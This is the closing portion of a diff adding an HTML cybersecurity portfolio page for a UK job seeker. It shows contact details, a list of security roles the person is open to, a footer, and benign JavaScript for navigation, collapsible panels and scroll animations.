+        <div class="contact-row"><div class="contact-icon">📍</div><div><div class="contact-label">Location</div><div class="contact-value">Coventry, UK — hybrid / remote UK-wide</div></div></div>
+        <div class="contact-row"><div class="contact-icon">📞</div><div><div class="contact-label">Phone</div><div class="contact-value">+44 7585 674265</div></div></div>
+        <div class="contact-row"><div class="contact-icon">✉</div><div><div class="contact-label">Email</div><div class="contact-value">d.dtanasie@gmail.com</div></div></div>
+        <div class="contact-row"><div class="contact-icon">🔗</div><div><div class="contact-label">LinkedIn</div><div class="contact-value">linkedin.com/in/Dumitru-Tanasie</div></div></div>
+        <div class="contact-row"><div class="contact-icon">🏴‍☠️</div><div><div class="contact-label">Hack The Box</div><div class="contact-value">Active — profile available on request</div></div></div>
+        <div class="contact-row"><div class="contact-icon">🛡</div><div><div class="contact-label">HackerOne</div><div class="contact-value">Registered — disclosure trained</div></div></div>
+      </div>
+      <div class="availability-card">
+        <div class="avail-title">Open to opportunities</div>
+        <div class="avail-item"><div class="avail-dot ad-green"></div>SOC Analyst L1 — available now</div>
+        <div class="avail-item"><div class="avail-dot ad-green"></div>Junior Penetration Tester — available now</div>
+        <div class="avail-item"><div class="avail-dot ad-green"></div>IT Support / Sysadmin with cyber focus</div>
+        <div class="avail-item"><div class="avail-dot ad-green"></div>Security Analyst / GRC Analyst</div>
+        <div class="avail-item"><div class="avail-dot ad-blue"></div>Graduate Cyber Consultant (post-graduation)</div>
+        <div class="avail-item"><div class="avail-dot ad-blue"></div>Freelance: AI annotation, Cyber Essentials consulting</div>
+        <div style="margin-top:1.5rem;padding-top:1rem;border-top:1px solid var(--border)">
+          <div style="font-family:var(--mono);font-size:11px;color:var(--text3);letter-spacing:1px;margin-bottom:0.75rem;text-transform:uppercase">Preferred working</div>
+          <div style="display:flex;flex-wrap:wrap;gap:6px">
+            <span class="stag">Remote</span><span class="stag">Hybrid</span><span class="stag">Coventry</span><span class="stag">Birmingham</span><span class="stag">UK-wide</span><span class="stag">Part-time OK</span><span class="stag">Full-time OK</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-text">
+    <span>DUMITRU TANASIE</span> · Cybersecurity Portfolio · Coventry, UK · 2026
+    <br><span style="color:var(--text3);margin-top:4px;display:block">Built with HTML/CSS/JS · Hosted on GitHub Pages · dumitrutanasie.github.io</span>
+  </div>
+</footer>
+
+<script>
+function toggleNav(){
+  document.getElementById('navlinks').classList.toggle('open');
+}
+function toggleCode(btn){
+  const code=btn.nextElementSibling;
+  code.classList.toggle('open');
+  btn.textContent=code.classList.contains('open')?'▼ hide commands':'▶ show commands';
+}
+function toggleWriteup(item){
+  item.classList.toggle('open');
+}
+const obs=new IntersectionObserver((entries)=>{
+  entries.forEach(e=>{
+    if(e.isIntersecting){
+      e.target.classList.add('visible');
+      e.target.querySelectorAll('.skill-fill,.lab-progress-fill').forEach(bar=>{
+        const w=bar.style.width;
+        bar.style.width='0';
+        setTimeout(()=>{bar.style.width=w},100);
+      });
+    }
+  });
+},{threshold:0.1});
+document.querySelectorAll('.fade-in').forEach(el=>obs.observe(el));
+const navLinks=document.querySelectorAll('.nav-links a');
+const sections=document.querySelectorAll('section[id]');
+window.addEventListener('scroll',()=>{
+  let cur='';
+  sections.forEach(s=>{
+    if(window.scrollY>=s.offsetTop-100) cur=s.id;
+  });
+  navLinks.forEach(a=>{
+    a.classList.remove('active');
+    if(a.getAttribute('href')==='#'+cur) a.classList.add('active');
+  });
+});
+</script>
+</body>
+</html>
